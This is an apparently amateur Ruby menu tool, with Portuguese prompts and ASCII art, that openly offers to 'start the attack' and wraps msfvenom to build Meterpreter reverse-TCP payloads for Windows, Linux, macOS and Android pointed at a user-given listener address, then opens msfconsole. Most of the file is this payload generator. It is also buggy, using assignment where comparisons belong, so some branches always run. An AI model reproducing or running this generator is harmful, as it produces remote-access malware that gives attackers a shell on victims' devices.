opcao=""
payload_opt=""

while opcao != "6"
system("clear")
puts"____________________________________________________________"
puts"             | CABEIA | PAYLOAD | METERPRETER|"
puts"____________________________________________________________"
puts"´´´¶¶¶¶´´´´´´´´´´s¶¶¶¶¶´´´´´´´´´´´s¶¶¶\n"
puts"´´´´¶¶¶¶¢´´´´´7¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶\n"
puts"´´´7¶¶¶¶¢´´´¢¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´s¶¶¶¶s\n"
puts"´´¶¶¶¶¶¶¶¶´ø¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1´¶¶¶¶¶¶¶¶\n"
puts"´´¢øs$¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¢¢$$\n"
puts"´´´´´´´´7¢ø¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶s´ø\n"
puts"´´´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\n"
puts"´´´´´´´´´´1¶¶¶¶ø´´7¶¶¶¶¶1´ø¶¶¶¶¶s\n"
puts"´´´´´´´´´´´¶¶´´´´´´´¶¶¶´´´´´´s¶¶\n"
puts"´´´´´´´´´´1¶¶´´´´´´$¶¶¶1´´´´´´¶¶1\n"
puts"´´´´´´´´´´´¶¶¶´´s¶¶¶´´ø¶¶s´´¶¶¶¶\n"
puts"´´´´´´´´´´´7¶¶¶¶¶¶¶¶´´´¶¶¶¶¶¶¶¶1\n"
puts"´´´´´´´´´´´´´¶¶¶¶¶¶¶s$s¶¶¶¶¶¶\n"
puts"´´´´´´´´´´´ø¶´¶s¶¶¶¶¶¶¶¶¶¶¶´¶´¶s\n"
puts"´´´´7´´´´$¶¶¶´¶´´´´´´´´´´´$´¶¶¶¶¶\n"
puts"´1¶¶¶¶¶¶¶¶¶¶ø´¶´¶¶$¶¶$¶¶$¶7¶1´¶¶¶¶¶¶¶¶¶¶¶\n"
puts"´´¶¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶1´´´¶¶¶¶¶¶¶¶¶\n"
puts"´´´ø¶¶¶¶¶´´´´´´1¶¶¶¶¶¶¶¶¶¶¢´´´´´´¶¶¶¶¶¶¶\n"
puts"´´´´´s¶¶ø´´´´´´´´´$¶¶¶¶¶s´´´´´´´´1¶¶¶\n"
puts"_____________________________________________________________"
puts"             |Escolha a opção para iniciar o ataque|         "
puts"_____________________________________________________________"
puts"==>[1] PAYLOAD [Criar o PAYLOAD usando o msfvenom]"
puts"==>[2] Listen [iniciar o multi/hundler]"
puts"==>[3] Persistencia [Criar o PAYLOAD usando o msfvenom]"
puts"==>[4] ARMITAGE [Criar o PAYLOAD usando o msfveno]"
puts"==>[5] Acerca: [www.daltoncabeia.tk]"
puts"==>[6] Sair: [www.daltoncabeia.tk]"


opcao=gets.chomp
case opcao
when "1"
  while payload_opt !="0"
    system("clear")
    puts"____________________________________________________________"
    puts"             | CABEIA | MSVENOM | METERPRETER|"
    puts"____________________________________________________________"
    puts"........................ /´ /)\n"
    puts"......................,../¯ ..//\n"
    puts"......................../... ./ /\n"
    puts"......................,/¯ ..//\n"
    puts"...................../... ./ /\n"
    puts"............./´¯/'...'/´¯`.¸\n"
    puts"........../'/.../..../... ..../¨¯\\n"
    puts"........('(...´(.......... ,~/'...')\n"
    puts".........\............... ..\/..../\n"
    puts"..........''...\......... . _...´\n"
    puts"............\............ ..(\n"
    puts"..............\.......... ...\\n"
    puts"____________________________________________________________"
    puts"==>[1] Windows"
    puts"==>[2] Linux"
    puts"==>[3] Mac "
    puts"==>[4] Android "
    puts"==>[5] Listar"
    puts"==>[6] msfconsole "
    puts"==>[0] SAIR"
    puts"_____________________________________________________________"
    payload_opt=gets.chomp
    puts"_____________________________________________________________"
if(payload_opt!="5")
    puts"==>Nome do PAYLOAD(exe|.elf|.macho|.apk):"
    nomeAplicativo=gets.chomp
    puts"==>Informe LHOST IP:"
    lhost=gets.chomp
    puts"==>Informe LPORT IP:"
    lport=gets.chomp
  end
      if(payload_opt=="1")
          puts"_____________________________________________________________"
          %x[sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe > ~/Desktop"/#{nomeAplicativo}.exe"]
          puts"_____________________________________________________________"
          puts"==>~/Desktop/#{nomeAplicativo}.exe Salvo com sucesso!"
          puts"_____________________________________________________________"
          puts "Clica Enter Para Continuar"
          gets
      end
      if (payload_opt=="2")
        puts"_____________________________________________________________"

        %x[sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f elf > ~/Desktop"/#{nomeAplicativo}.elf"]
        puts"_____________________________________________________________"
        puts"==>~/Desktop/#{nomeAplicativo}.elf Salvo com sucesso!"
        puts"_____________________________________________________________"
        puts "Clica Enter Para Continuar"
        gets
      end
      if (payload_opt=="3")
        puts"_____________________________________________________________"

        %x[sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f macho > ~/Desktop"/#{nomeAplicativo}.macho"]
        puts"_____________________________________________________________"
        puts"==>~/Desktop/#{nomeAplicativo}.macho Salvo com sucesso!"
        puts"_____________________________________________________________"
        puts "Clica Enter Para Continuar"
        gets
      end
      if (payload_opt=="4")
        puts"_____________________________________________________________"

        %x[sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > ~/Desktop"/#{nomeAplicativo}.apk"]
        puts"_____________________________________________________________"
        puts"==>~/Desktop/#{nomeAplicativo}.apk Salvo com sucesso!"
        puts"_____________________________________________________________"
        puts "Clica Enter Para Continuar"
        gets
      end


      if(payload_opt="5")
        %x[msfvenom -l]
        puts "Clica Enter Para Continuar"
        gets
      end
      if(payload_opt="6")
        %x[msfconsole]
        puts "Clica Enter Para Continuar"
        gets
      end


    end
when "2"#[2] Listen [iniciar o multi/hundler]
end

end
